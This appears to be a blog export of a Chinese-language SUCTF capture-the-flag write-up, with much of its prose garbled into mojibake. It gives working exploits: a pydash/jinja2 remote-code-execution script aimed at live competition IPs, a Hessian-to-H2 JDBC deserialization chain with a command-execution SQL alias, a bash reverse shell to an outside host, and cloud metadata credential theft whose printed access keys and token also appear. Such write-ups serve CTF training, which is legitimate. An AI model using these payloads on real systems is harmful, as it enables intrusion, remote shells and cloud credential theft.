add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, 